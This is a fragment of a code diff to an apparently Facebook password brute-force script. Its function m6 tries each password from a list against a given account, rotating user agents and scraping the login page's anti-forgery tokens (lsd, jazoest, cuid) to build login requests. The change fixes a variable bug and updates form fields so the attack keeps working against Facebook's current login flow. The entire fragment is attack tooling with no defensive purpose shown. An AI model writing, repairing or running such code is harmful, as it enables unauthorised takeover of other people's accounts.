@@ -1209,19 +1209,19 @@ def m6(idf,pwv):
  try:
   for ps in pwv:
    session = requests.Session()
-   referer_url = f'https://www.facebook.com/login/web/?email={ids}&is_from_lara=1'
+   referer_url = f'https://www.facebook.com/login/web/?email={idf}&is_from_lara=1'
    pro = random.choice(ugen)
    free_fb = session.get(referer_url).text
+   params = {
+   'flow': 'initiate_view',
+   'ls': 'initiate_view',
+   'c': f'https://mbasic.facebook.com/login/?email={idf}&li=x-XKZs2ocnd6TEeq6PC-lIUz&e=1348092&shbl=1&refsrc=deprecated',}
    log_data = {
-             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":idf,
-            "pass":ps,
-            "login":"Log In"}
+   'lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   'jazoest':re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+   'cuid':re.search('name="cuid" value="(.*?)"', str(free_fb)).group(1),
+   'flow': 'initiate_view',
+   'pass': ps,}
    header_freefb = {
             'authority': 'm.facebook.com',
             'method': 'GET',
